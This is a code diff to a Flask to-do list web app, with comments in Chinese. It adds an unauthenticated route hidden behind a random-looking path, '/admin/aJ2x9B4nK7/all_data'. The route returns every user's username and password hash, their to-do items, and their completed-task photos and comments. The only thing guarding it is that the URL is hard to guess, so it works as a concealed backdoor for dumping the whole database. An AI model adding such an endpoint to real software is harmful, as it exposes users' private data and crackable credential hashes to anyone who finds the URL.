@@ -282,3 +282,48 @@ def delete_todo_item(username, item_id):
     db.session.delete(item)
     db.session.commit()
     return jsonify({'message': 'Todo item deleted'})
+
+@app.route('/admin/aJ2x9B4nK7/all_data', methods=['GET'])
+def get_all_data():
+    all_data = {}
+
+    # 獲取所有用戶
+    users = User.query.all()
+
+    for user in users:
+        user_data = {
+            'id': user.id,
+            'username': user.username,
+            'password': user.password,  # 注意：這是哈希後的密碼
+            'todo_list': [],
+            'completed_tasks': []
+        }
+
+        # 獲取用戶的待辦清單
+        todo_items = TodoList.query.filter_by(user_id=user.id).all()
+        for item in todo_items:
+            content = json.loads(item.content)
+            user_data['todo_list'].append({
+                'id': item.id,
+                'title': content['title'],
+                'steps': content['steps'],
+                'time': content['time'],
+                'done': item.done,
+                'list_type': item.list_type
+            })
+
+        # 獲取用戶的已完成任務
+        completed_tasks = CompletedTask.query.filter_by(user_id=user.id).all()
+        for task in completed_tasks:
+            user_data['completed_tasks'].append({
+                'id': task.id,
+                'photo': task.photo,
+                'comment1': task.comment1,
+                'comment2': task.comment2,
+                'title': task.title,
+                'date': task.date
+            })
+
+        all_data[user.username] = user_data
+
+    return jsonify(all_data)
